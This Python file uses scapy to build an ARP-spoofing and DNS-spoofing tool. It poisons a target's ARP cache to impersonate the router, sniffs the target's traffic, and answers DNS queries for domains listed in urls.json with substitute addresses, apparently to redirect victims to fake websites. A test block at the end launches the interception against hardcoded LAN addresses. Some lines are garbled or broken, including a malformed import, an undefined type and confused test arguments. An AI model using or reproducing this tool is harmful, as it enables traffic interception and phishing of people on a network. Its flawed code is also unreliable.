from scapy.all import DNS, IP, an# type:ignore
from scapy.layers.l2 import ARP,Ether
from scapy.layers.inet import UDP,IP,sr1 #type :ignore
from scapy.layers.dns import DNS,DNSQR,DNSRR

import scapy.all as scapy

import json



class Spoofer:
    def __init__(self,host_ip,target_ip,router_ip) -> None:
        self.__ip = host_ip
        self.__target_ip = target_ip
        self.__router_ip = router_ip

    def spoof(self): # Main
        """sending spoofed packet.
        """
        # getting the MAC of the target
        target_mac = self.get_mac(self.__target_ip)
        # generating the spoofed packet modifying the source and the target
        packet = ARP(op=2, # request
                        hwdst=target_mac, # mac destination - target mac
                        pdst=self.__target_ip, # ip destination
                    psrc=self.__router_ip) # ip source
        # This packet is saying - I am the router.

        # sending the packet
        scapy.send(packet, verbose=False)

            
    
    def checkout(self):
        """stop spoofing.
        """
        self.restore_defaults(self.__target_ip,self.__ip)
    
    def restore_defaults(self,dest, source):
        # getting the real MACs
        target_mac = self.get_mac(dest) # 1st (router), then (windows)
        source_mac = self.get_mac(source)
        # creating the packet
        packet = ARP(op=2, pdst=dest, hwdst=target_mac, psrc=source, hwsrc=source_mac)
        # sending the packet
        scapy.send(packet, verbose=False)

    def get_mac(self,ip: str):
        """Get mac of the router using actual ARP.

        Args:
            ip (str): ipv4 of the target.

        Returns:
            mac address of the target.
        """
        # request that contain the IP destination of the target
        # broadcast packet creation
        final_packet = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip)
        # getting the response
        answer = scapy.srp(final_packet, timeout=2, verbose=False)[0]
        # getting the MAC (its src because its a response)
        mac = answer[0][1].hwsrc
        return mac

    
    def process_packet(self,packet):
        """
        This function will identify when a request is a DNS request, and handle it. If the requested address is 
        in the urls list, than send IP of the real url. Otherwise, return the real url.
        
        When sniffing a dns packet from target:
        Extract domain name -> If is in url dict, replace for actual domain name -> Send dns query to dns server -> receive dns response -> Modify ip src and dst -> Send dns response to target.
        """
        if DNS in packet and packet[DNS].qr == 0: # Check if packet is a dns query.
            dns_layer = packet[DNS]
            domain: str = dns_layer.qd.qname.decode() # Retrieve domain.
            urls: dict[str,str] = self.get_urls()
            if domain in urls.keys():
                response_packet = self.nslookup(urls[domain])
                self.register(domain,packet)
            else:
                response_packet = self.nslookup(domain)
                
            response_packet[IP].src,response_packet[IP].dst = packet[IP].dst,packet[IP].src
            # Modify the response packet, so it will match target's original query.
            scapy.send(response_packet) #type:ignore
    
    def forward_to_router(self):
        """
        Performs MITM. 
        When the spoofing starts taking effect, all of the target computer's traffic will reach this machine.
        Using scapy to sniff all of the packets from target to router, and calling process_packet to handle them.
        """
        scapy.sniff(filter=f"ip src {self.__target_ip} and ip dst not {self.__ip}",prn=self.process_packet,store=0) 
        # Capture all packets sent from the target, and not meant for host. because of the ARP spoofing, this packets are meant to be sent to the router.
        # Dump all corresponding packets into process_packet to handle.

    
    def register(self,fake_url,packet):
        """
        register connection to fake website. note the IP, and such.
        """
        raise NotImplementedError
    
    
    def get_urls(self) -> dict[str,str]:
        """
        return url dict, from urls.json
        """
        try:
            with open('urls.json', "r") as f:
                urls: dict[str, str] = json.load(f)
        except (json.JSONDecodeError, FileNotFoundError):
            urls = {}
        return urls


    def nslookup(self,domain) -> Packet: # type:ignore
        dns_query = IP(dst="8.8.8.8") / UDP(dport=53) / DNS(qdcount=1, rd=1,qd = 0)/DNSQR(qname=domain)
        response_packet = sr1(dns_query,verbose=0)
        return response_packet
        
        #### Maybe for future use.
        dnsrr_list = response_packet.an
        
        
        # Check if the response contain Canonical name
        if dnsrr_list[0].type == 5:
            print("Name:   ", dnsrr_list[0].rdata.decode())
            print("Address:  ", end="")
            # Print all dnsrrs
            for dnsrr in dnsrr_list[1:]:
                print(dnsrr.rdata)
            print("Aliases: ", domain)
        else:  # if does not contain Canonical name
            print("Name:   ", domain)
            print("Address:  ", end="")
            # Print all dnsrrs
            for dnsrr in dnsrr_list:
                if (dnsrr != None):
                    print(dnsrr.rdata)  
        



#### TEST:
host_ip = "192.168.1.128"
router_ip = "192.168.1.1"
spoof = Spoofer("192.168.0.0",host_ip,router_ip)
spoof.forward_to_router()

